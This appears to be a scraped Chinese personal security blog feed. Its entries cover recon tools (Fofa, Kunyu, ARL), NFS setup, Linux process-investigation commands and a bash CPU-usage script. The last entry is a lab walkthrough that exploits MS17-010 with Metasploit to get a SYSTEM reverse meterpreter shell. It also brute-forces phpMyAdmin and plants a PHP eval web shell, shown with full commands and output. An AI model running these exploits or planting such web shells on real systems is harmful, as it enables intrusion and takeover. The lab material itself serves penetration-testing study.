id="知识点-7"><a href="#知识点-7" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、小程序-外在-资产收集</p><p>2、APP-外在&amp;内在-资产收集</p><p>appinfoscanner:</p><pre><code>python app.py -i filpath</code></pre><p>APP-外在抓包-Fd&amp;茶杯&amp;Burp</p><p>APP-外在封包-封包监听工具</p><p>APP-内在提取-ApplnfoScanner</p><p>APP-内在搜索-反编译载入IDEA</p><p>APP-资源提取-安装包&amp;资源文件</p><p>APP-框架使用-Xposed&amp;JustTrustMe</p><p>小程序-微信-电脑版登录启动抓包分析</p><h1 id="Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔"><a href="#Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔" class="headerlink" title="Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔"></a>Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、网络空间四大引整-FofasQuakesshodan&amp;zoomeye</p><p>2、自动化信息收集项目-ARL灯塔ssuize水泽&amp;Kunyu坤舆</p><p>3、单点功能信息收集项目-企查:子域名s指纹识别&amp;社工信息</p><h2 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="#黑暗引擎:"></a>#黑暗引擎:</h2><p><a href="https://fofa.info/">https://fofa.info</a><br><a href="https://quake.360.cn/">https://quake.360.cn</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p><p>搜索关联资产-特征资产-资产信息</p><h2 id="自动项目"><a href="#自动项目" class="headerlink" title="#自动项目:"></a>#自动项目:</h2><p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p><p><a href="https://github.com/0x727/shuiZe_0x727">https://github.com/0x727/shuiZe_0x727</a></p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>#相关资源:<br><a href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p><p>Finger配置相关信息在个人中心中查找，支FOFA和360QuakeKey，配置好后</p><ol><li>Finger追求极简命令参数只有以下几个:</li><li>-u 对单个URL进行指纹识别</li><li>-f对指定文件中的url进行批量指纹识别。</li><li>-i对ip进行fofa数据查询采集其web资产。</li><li>-if 对指定文件中的ip批量调用fofa进行数据查询采集其web资产</li><li>-fofa 调用fofa api进行资产收集</li><li>-quake 调用360 quake进行资产收集</li><li>-0指定输出方式默认不选择的话是xsx格式，支持json，xs。</li></ol><p>但finger好像用不了了，不懂怎么回事，还是用kunyu试试，安装时记得换源，或者加上</p><p><a href="https://blog.csdn.net/AD_CSY/article/details/119887450">https://blog.csdn.net/AD_CSY/article/details/119887450</a></p><p><a href="https://www.cnblogs.com/chenzhou2020/p/14207951.html">https://www.cnblogs.com/chenzhou2020/p/14207951.html</a></p><pre><code>1、临时使用1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package2、永久更改pip源升级 pip 到最新的版本 (&gt;=10.0.0) 后进行配置：1 pip install pip -U2 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple如果您到 pip 默认源的网络连接较差，临时使用镜像站来升级 pip：1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U</code></pre><p>报错可以去看看github相关的库，说不定pip下来的库少了几个文件。。。</p><p><a href="https://blog.csdn.net/wuqixiufen2/article/details/138408527">https://blog.csdn.net/wuqixiufen2/article/details/138408527</a></p><p>还有一种解决方法，创建python虚拟环境，debian下的更新pip好像不用python -m</p><p>换到了个windows10虚拟机，然后pip安装，在虚拟机中就顺利许多，python版本一致，但pip版本不一致，所以估计大部分报错都是pip版本问题，和一个ai的库对其它库的要求，所以导致pip install 失败</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NFS</title>
      <link href="/2024/05/27/NFS/"/>
      <url>/2024/05/27/NFS/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置（巨难搞）"><a href="#环境配置（巨难搞）" class="headerlink" title="环境配置（巨难搞）"></a>环境配置（巨难搞）</h1><p>你普通的yum install dnf后，执行命令可能会出现段错误，这我觉得可能版本太旧了，dmesg会发现出现在python2.7.5,试着更新下源，结果一个错误解决又出现另一个错误。。。</p><p><a href="https://ipcmen.com/dnf">https://ipcmen.com/dnf</a></p><p><a href="https://blog.csdn.net/GX_1_11_real/article/details/99670417">https://blog.csdn.net/GX_1_11_real/article/details/99670417</a></p><p><a href="https://blog.csdn.net/qq_34202873/article/details/117094056">https://blog.csdn.net/qq_34202873/article/details/117094056</a></p><p><a href="https://www.cnblogs.com/zgqbky/p/13036069.html">https://www.cnblogs.com/zgqbky/p/13036069.html</a></p><p>修改resolve.conf不够解决问题，需要继续在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33增加DNS</p><p>安装完成后，有个情况dnf的信息很少，因为有些东西没安装全，需要换源</p><p>换源的时候注意aliyun的镜像源里Centos-Base.repo需要把里面的$releaserver换成7，最好是把yum.reepos.d文件夹备份后，在重新创建个空文件，然后换源。</p><pre><code>:%s/$releaserver/7/g   </code></pre><p>还有一点，如果你安装了docker，需要注意连docker的源一起换了，不然会报错</p><p><a href="https://blog.csdn.net/YouMing_Li/article/details/117375461">https://blog.csdn.net/YouMing_Li/article/details/117375461</a></p><p>通过这个方法可以解决，且同样要将$releaserver替换成7</p><p>换了好多的源，终于是安装成了，这时候会发现安装的dnf的体量比之前大</p><p>总结：</p><p>自己测试了，有些错误跟大家分享一下<br>①：没有dnf，直接yum install dnf发现dnf -version运行会出现段错误，搜索有些解决方法，可能太复杂看不懂，简单粗暴点就是重新装过，装的过程中发现，yum下载的dnf是旧版本的，你需要更新一下缓存，yum clean all；yum makecache或者yum update，然后再下载dnf会发现返回的信息变多了，这次估计是下对了<br>②：用yum下载那两个工具：一样的问题，也要重新获取缓存，不然会发现命令缺了一些<br>③：换源过程中，我用的是centos7，重新获取缓存时出现404错误，可能是你的&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo的文件有个$releaserver需要替换成7，在文件里:%s&#x2F;$releaserver&#x2F;7&#x2F;g,把它们替换即可<br>④：报host的错误：在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33里添加新的dns</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>看这篇就可以<a href="https://blog.csdn.net/Dark_Tk/article/details/114100517">https://blog.csdn.net/Dark_Tk/article/details/114100517</a></p><p>centos:安装完相应的工具后，启动对应服务</p><p>客户端同样的配置</p><p>mount ip:path &#x2F;unbuntu的目录</p><p>df -Th</p><pre><code>192.168.174.142:/home/youzipii/data nfs4       18G   15G  3.0G   84% /text</code></pre><p>最终测试u：</p><p>在centos的目录下创建text.txt写入hello</p><pre><code>[root@localhost data]# touch text.txt[root@localhost data]# vim text.txt</code></pre><p>在ubuntu系统下查看</p><pre><code>root@youzipii-virtual-machine:/text# cat text.txt hello</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux排查经验</title>
      <link href="/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-x2F-5-x2F-25"><a href="#2024-x2F-5-x2F-25" class="headerlink" title="2024&#x2F;5&#x2F;25"></a>2024&#x2F;5&#x2F;25</h1><p>文章来源: https:<em>&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;3015</em></p><h2 id="查CPU异常占用"><a href="#查CPU异常占用" class="headerlink" title="查CPU异常占用"></a>查CPU异常占用</h2><pre><code>top -c -o %CPU</code></pre><p>显示了系统中所有进程的 CPU 使用率，并且按照使用率从高到低排序，有时候出现超过百分百也有可能是因为多核CPU0.</p><p>% cpu 是表示单核 cpu 的占用率, 而不是占用所有 cpu 的占用率。可以通过按1查看系统是否有多个CPU</p><p>查出异常程序就可以去查看设备管理器去看该进程运行历史记录</p><h2 id="查看pid对应的进程"><a href="#查看pid对应的进程" class="headerlink" title="查看pid对应的进程"></a>查看pid对应的进程</h2><pre><code>ps -aux</code></pre><ul><li><code>a</code>：显示所有终端的进程。</li><li><code>u</code>：以用户易读的格式显示进程信息。</li><li><code>x</code>：显示没有控制终端的进程。</li></ul><p>如果你想要 <code>ps</code> 命令的输出按照 CPU 使用率排序，你可以使用 <code>sort</code> 命令来辅助排序，例如：</p><pre><code>ps -aux --sort=-%cpu</code></pre><h2 id="进入对应的PID查看具体路径信息"><a href="#进入对应的PID查看具体路径信息" class="headerlink" title="进入对应的PID查看具体路径信息"></a>进入对应的PID查看具体路径信息</h2><pre><code>ps -aux | grep PID</code></pre><p>查到路径，可以拷贝相关文件分析，微步之类的，看是否是恶意远控陈旭等</p><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>​Linux系统启动时会启动很多系统服务进程，这些系统服务进程没有控制终端，不能直接和用户交互。其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程(守护进程)不受用户登录注销的影响，它们一直在运行着。这种进程有一个名称叫守护进程(Daemon)。<br>​守护进程也被称为精灵进程，是运行在后台的一种特殊进程，它独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。</p><h3 id="守护进程的特点"><a href="#守护进程的特点" class="headerlink" title="守护进程的特点"></a>守护进程的特点</h3><p>(1)在Linux中，每个系统与用户进行交流的界面成为终端，每一个从此终端开始运行的进程都会依附于这个终端，这个终端被称为这些进程的控制终端；</p><p>(2)当控制终端被关闭的时候，相应的进程都会自动关闭。但是守护进程却能突破这种限制，它脱离于终端并且在后台运行，(脱离终端的目的是为了避免进程在运行的过程中的信息在任何终端中显示并且进程也不会被任何终端所产生的终端信息所打断)，它从被执行的时候开始运转，直到整个系统关闭才退出(当然可以认为是杀死相应的守护进程)；</p><p>(3)如果想让某个进程不因为用户或中断或其他变化而影响，那么就必须把这个进程变成一个守护进程。</p><h3 id="如何杀死守护进程"><a href="#如何杀死守护进程" class="headerlink" title="如何杀死守护进程"></a>如何杀死守护进程</h3><p>1.首先</p><pre><code>ps axj | grep 守护进程名字</code></pre><p>找到相应的守护进程，然后使用</p><pre><code>kill -9 守护进程名</code></pre><p>2.利用<code>ps -ef</code>命令查找相应的守护进程，再用<code>kill -9</code>命令将其杀死；</p><p>3.创建shell脚本对进程的启动、关闭、重启进行自动管理。</p><p>下面我们继续寻找守护进程<br>进一步排查，计划任务没有</p><pre><code>crontab -l</code></pre><h1 id="2024-x2F-6-x2F-5"><a href="#2024-x2F-6-x2F-5" class="headerlink" title="2024&#x2F;6&#x2F;5"></a>2024&#x2F;6&#x2F;5</h1><p>查看默认网关记录：route -n</p><pre><code>[youzipii@localhost /]$ route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         192.168.174.2   0.0.0.0         UG    0      0        0 ens33</code></pre><p>查看指定网卡的信息 ifconfig 网卡名字</p><pre><code>ifconfig ens33</code></pre><p>查看当前使用的DNS信息</p><pre><code>[youzipii@localhost /]$ cat /etc/resolv.conf# Generated by NetworkManagernameserver 8.8.8.8nameserver 114.114.114.114search localdomain</code></pre><p>查看主机名</p><pre><code>[youzipii@localhost /]$ hostnamelocalhost.localdomain</code></pre><h1 id="2024-x2F-6-x2F-10"><a href="#2024-x2F-6-x2F-10" class="headerlink" title="2024&#x2F;6&#x2F;10"></a>2024&#x2F;6&#x2F;10</h1><pre><code>tcpdump -i ens33 -w - | pv -bert &gt; /dev/null</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个CPU平均使用率脚本</title>
      <link href="/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<pre><code class="bash">#!/bin/bashPREV_TOTAL=0 #存储CPU总时间PREV_IDLE=0 #存储CPU空闲时间while true; do        #读取CPU统计数据并累加到TOTAL变量    CPU=($(sed -n &#39;s/^cpu\s//p&#39; /proc/stat))    IDLE=$&#123;CPU[3]&#125;    TOTAL=0    for VALUE in &quot;$&#123;CPU[@]:0:8&#125;&quot;; do        TOTAL=$((TOTAL+VALUE))    done    #计算当前与上一次的CPU总时间差并4舍5入    DIFF_IDLE=$((IDLE-PREV_IDLE))    DIFF_TOTAL=$((TOTAL-PREV_TOTAL))    DIFF_USAGE=$(((1000*(DIFF_TOTAL-DIFF_IDLE)/DIFF_TOTAL+5)/10))    #打印使用率并更新变量以供下一次使用    echo -en &quot;\rCPU: $DIFF_USAGE% \b\b&quot;    PREV_TOTAL=&quot;$TOTAL&quot;    PREV_IDLE=&quot;$IDLE&quot;    sleep 1done</code></pre><p><code>sed</code> 是一个流编辑器，用于对文本进行处理。命令 <code>sed -n &#39;s/^cpu\s//p&#39; /proc/stat</code> 的意思是：</p><ul><li><code>sed</code>: 调用流编辑器。</li><li><code>-n</code>: 告诉 <code>sed</code> 不要自动打印每一行。</li><li><code>&#39;s/^cpu\s//p&#39;</code>: 这是传递给 <code>sed</code> 的脚本。<ul><li><code>s</code>: 表示替换操作。</li><li><code>/^cpu\s//</code>: 这是替换的模式。<code>^</code> 表示行的开始，<code>cpu</code> 是要查找的字符串，<code>\s</code> 表示空白字符（如空格、制表符等），<code>//</code> 表示查找模式的结束。</li><li><code>p</code>: 表示打印（print）。</li></ul></li><li><code>/proc/stat</code>: 这是 <code>sed</code> 要处理的文件。<code>/proc/stat</code> 是一个伪文件系统，其中包含了系统的状态信息，包括 CPU 的使用情况。</li></ul><p>所以，这个命令的意思是：使用 <code>sed</code> 来处理 <code>/proc/stat</code> 文件，查找以 “cpu” 开头的行，然后删除这些行开头的 “cpu” 和随后的空白字符，并打印这些行。</p><p>通常，<code>/proc/stat</code> 中的 “cpu” 行会显示 CPU 的使用情况，例如：</p><pre><code>cpu  0 0 0 0 0 0 0 0 0 0cpu0 0 0 0 0 0 0 0 0 0cpu1 0 0 0 0 0 0 0 0 0...</code></pre><p>执行上述 <code>sed</code> 命令后，会打印出除去 “cpu” 和空白字符后的行，例如：</p><pre><code>0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0...</code></pre><p>这些数字分别表示用户空间占用 CPU 时间的比例、系统空间占用 CPU 时间的比例、空闲 CPU 时间的比例等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝利用测试</title>
      <link href="/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><h2 id="综合渗透测试框架"><a href="#综合渗透测试框架" class="headerlink" title="综合渗透测试框架"></a>综合渗透测试框架</h2><ol><li>Auxiliary  辅助模块  为渗透测试信息搜集提供了大量的辅助模块支持</li><li>Exploits 攻击模块  利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</li><li>Payload 攻击载荷模块   攻击成功后促使靶机运行的一段植入代码</li><li>Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</li><li>Encoders   编码模块    将攻击载荷进行编码，来绕过防护软件拦截</li></ol><h2 id="初始化，不然内置的db-namp等指令用不了"><a href="#初始化，不然内置的db-namp等指令用不了" class="headerlink" title="初始化，不然内置的db_namp等指令用不了"></a>初始化，不然内置的db_namp等指令用不了</h2><pre><code class="console">开启数据库service postgresql start初始化数据库msfdb init开启控制台msfconsole查看数据库连接状态db_status</code></pre><h3 id="常用帮助指令"><a href="#常用帮助指令" class="headerlink" title="常用帮助指令"></a>常用帮助指令</h3><p>help&#x2F;?     帮助菜单</p><p>exit 退出MSF控制台</p><p>Back     返回上一级</p><p>info 显示一个或者多个模块的信息</p><p>show 显示所给类型的模块</p><p>background  将当前操作在后台运行</p><p>use  使用所选择的模块</p><p>set 设置选项</p><p>unset 取消设置的选项</p><p>session 会话，主要是多个目标，切换时可以选择</p><h2 id="Auxiliary模块：show-auxiliary"><a href="#Auxiliary模块：show-auxiliary" class="headerlink" title="Auxiliary模块：show auxiliary"></a>Auxiliary模块：show auxiliary</h2><p>命名规则:功能&#x2F;服务&#x2F;名称     scanner&#x2F;smb&#x2F;smb_ms17_010</p><h3 id="Exploits模块：show-exploits"><a href="#Exploits模块：show-exploits" class="headerlink" title="Exploits模块：show exploits"></a>Exploits模块：show exploits</h3><p>rank表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</p><p>命名规则:操作系统&#x2F;服务&#x2F;名称   windows&#x2F;smb&#x2F;ms17_010_eternalblue </p><h3 id="Payload-模块"><a href="#Payload-模块" class="headerlink" title="Payload 模块"></a>Payload 模块</h3><p>命名规则:操作系统&#x2F;类型&#x2F;名称   windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><strong>kali：192.168.174.137</strong></p><p><strong>靶机（win2008r2 x64）：192.168.174.157</strong></p><p><strong>phpstud</strong></p><p><strong>phpMyAdmin 4.8.x:CVE-2018-12613</strong> </p><p><strong>漏洞介绍</strong></p><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><p><strong>漏洞描述</strong></p><p>在phpMyAdmin 4.8.x版本中，程序没有严格控制用户的输入，攻击者可以利用双重编码绕过程序的白名单限制，造成文件包含漏洞。</p><p><strong>受影响的系统版本</strong></p><p>phpMyAdmin 4.8.0</p><p>phpMyAdmin 4.8.1</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="根据名称搜索"><a href="#根据名称搜索" class="headerlink" title="根据名称搜索"></a>根据名称搜索</h3><pre><code class="console">msf6 &gt; search ms17Matching Modules================   #   Name                                                  Disclosure Date  Rank     Check  Description   -   ----                                                  ---------------  ----     -----  -----------   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-01</code></pre><h3 id="设置模块"><a href="#设置模块" class="headerlink" title="设置模块"></a>设置模块</h3><p>其中有exp和aux，我们先用aux进行扫描，看是否存在漏洞</p><pre><code>msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; 也可以use+序号use 24msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; optionsModule options (auxiliary/scanner/smb/smb_ms17_010):   Name         Current Setting             Required  Description   ----         ---------------             --------  -----------   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check                ework/data/wordlists/named                _pipes.txt   RHOSTS                                   yes       The target host(s), see https://docs.metasplo                                                      it.com/docs/using-metasploit/basics/using-met                                                      asploit.html</code></pre><p>yes的是需要设置的，no可以不用设置，有些事给你填好的</p><p>RHOST：目标地址（remote）</p><p>LHOST：本地地址</p><h3 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><p>端口扫描</p><pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; db_nmap -p 445 192.168.174.157[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:43 CST[*] Nmap: Nmap scan report for 192.168.174.157[*] Nmap: Host is up (0.00036s latency).[*] Nmap: PORT    STATE SERVICE[*] Nmap: 445/tcp open  microsoft-ds[*] Nmap: MAC Address: 00:0C:29:4E:42:2E (VMware)[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds</code></pre><p>漏洞扫描</p><pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.174.157RHOST =&gt; 192.168.174.157</code></pre><p>如果之前有用db_namp扫描过，可以直接从hosts中读取</p><pre><code>hosts -R</code></pre><pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>返回信息提示有可能存在漏洞</p><h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><pre><code class="console">#利用攻击模块msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; optionsModule options (exploit/windows/smb/ms17_010_eternalblue):   Name           Current Setting  Required  Description   ----           ---------------  --------  -----------   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/do                                             cs/using-metasploit/basics/using-metasploit.html   RPORT          445              yes       The target port (TCP)   SMBDomain                       no        (Optional) The Windows domain to use for authenticatio                                             n. Only affects Windows Server 2008 R2, Windows 7, Win                                             dows Embedded Standard 7 target machines.   SMBPass                         no        (Optional) The password for the specified username   SMBUser                         no        (Optional) The username to authenticate as   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. O                                             nly affects Windows Server 2008 R2, Windows 7, Windows                                              Embedded Standard 7 target machines.   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affect                                             s Windows Server 2008 R2, Windows 7, Windows Embedded                                             Standard 7 target machines.Payload options (windows/x64/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST     192.168.174.137  yes       The listen address (an interface may be specified)   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic Target</code></pre><p>这里用hosts设置试一下</p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hostsHosts=====address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments-------      ---           ----          -------       ---------  -----  -------  ----  --------192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server.157         42:2E         TF1           er 2008 R2msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts -RHosts=====address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments-------      ---           ----          -------       ---------  -----  -------  ----  --------192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server.157         42:2E         TF1           er 2008 R2RHOSTS =&gt; 192.168.174.157msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; optionsModule options (exploit/windows/smb/ms17_010_eternalblue):   Name           Current Setting  Required  Description   ----           ---------------  --------  -----------   RHOSTS         192.168.174.157  yes       The target host(s), see https://docs.metasploit.com/do                                             cs/using-metasploit/basics/using-metasploit.html   RPORT          445              yes       The target port (TCP)</code></pre><h3 id="选择payload"><a href="#选择payload" class="headerlink" title="选择payload"></a>选择payload</h3><p>因为漏洞的利用有不同的目的，也有不同的方式，我们这里就要选择自己需要的payload</p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloadsCompatible Payloads===================   #   Name                                                Disclosure Date  Rank    Check  Description   -   ----                                                ---------------  ----    -----  -----------   0   payload/generic/custom                              .                normal  No     Custom Payload   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline</code></pre><p>这里我们用reverse的，也就是反弹shell，而bind是正向的，目标服务器可能不一定支持我们去连接他，所以我们需要让他主动来连接我们，于是选择反弹shell</p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcp</code></pre><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run[*] Started reverse TCP handler on 192.168.174.137:4444 [*] 192.168.174.157:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)[+] 192.168.174.157:445 - The target is vulnerable.[*] 192.168.174.157:445 - Connecting to target for exploitation.[+] 192.168.174.157:445 - Connection established for exploitation.[+] 192.168.174.157:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.174.157:445 - CORE raw buffer dump (51 bytes)[*] 192.168.174.157:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2[*] 192.168.174.157:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard [*] 192.168.174.157:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac[*] 192.168.174.157:445 - 0x00000030  6b 20 31                                         k 1             [+] 192.168.174.157:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.174.157:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.174.157:445 - Sending all but last fragment of exploit packet[*] Sending stage (201798 bytes) to 192.168.174.157[*] Meterpreter session 1 opened (192.168.174.137:4444 -&gt; 192.168.174.157:49163) at 2024-05-21 12:50:03 +0800[-] 192.168.174.157:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError</code></pre><p>等待一会后，会进入后渗透模块meterpreter，可以使用getuid，来查看当前用户所属的权限</p><pre><code>meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><h2 id="实验环境二"><a href="#实验环境二" class="headerlink" title="实验环境二"></a>实验环境二</h2><p>创建低权限用户</p><pre><code>net user qaq 123abc. /addnet user 查看是否创建成功</code></pre><p>修改phpstudy进程的所有者</p><pre><code>服务-&gt;找到apache2进程-&gt;停止-&gt;属性-&gt;登录-&gt;此账户-&gt;浏览-&gt;找到qaq，输入密码应用即可</code></pre><p>但启动时会报错，因为阿帕奇的log文件夹会记录apache的信息，我们需要给这个文件赋予qaq写权限，然后重启相关服务即可，访问主页试试</p><p><img src="/../image/image-20240521173640201.png" alt="image-20240521173640201"></p><p>进入phpmyadmin页面</p><p><img src="/../image/image-20240521173736035.png" alt="image-20240521173736035"></p><h3 id="扫描靶机-1"><a href="#扫描靶机-1" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><pre><code>search phpmyadminuse 1options #要设置三个东西set rhost 192.168.174.1257set targeturi /phpMyAdmin-4.8.1/set userpass_file small.txt设置密码字典##用户名也可以设置字典爆破---------------------------------字典可以在文件中找locate small.txtcp path /root</code></pre><p>使用这个模块就算密码正确有时候也会失败，不好用，不如bp</p><h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><pre><code>search phpmyadminuse 8根据前面爆破出来的密码设置即可runmeterpreter &gt; getuidServer username: qaqmeterpreter &gt; sysinfoComputer    : WIN-R4FJ4HCKTF1OS          : Windows NT WIN-R4FJ4HCKTF1 6.1 build 7601 (Windows Server 2008 R2 Standard Edition Service Pack 1) i586Meterpreter : php/windowsmeterpreter &gt; getwdC:\phpStudy\WWW\phpMyAdmin-4.8.1</code></pre><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在线比对补丁查找exp：<a href="https://bugs.hacking8.com/tiquan/%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%98%AF%E6%A0%B9%E6%8D%AEsysinfo%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9F%A5%E6%89%BE%E7%9A%84%EF%BC%8C%E4%BD%86meterpreter%E6%B2%A1%E6%9C%89%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8D%A2%E4%B8%AA%E5%B7%A5%E5%85%B7">https://bugs.hacking8.com/tiquan/，因为这个是根据sysinfo的信息查找的，但meterpreter没有，需要换个工具</a></p><p>写木马,用antsword连</p><pre><code>edit 1.php&lt;?php eval($_REQUEST[123]) ?&gt;meterpreter &gt; ls 1.php100666/rw-rw-rw-  128849018910  fil  233591561222-02-03 07:15:02 +0800  1.php</code></pre><p>验证一下，访问这个页面，传一个phpinfo（）</p><pre><code>http://192.168.174.157/phpMyAdmin-4.8.1/1.php?123=phpinfo();</code></pre><p><img src="/../image/image-20240521210535033.png" alt="image-20240521210535033"></p><p>蚁🗡连接</p><p><img src="/../image/image-20240521213257467.png" 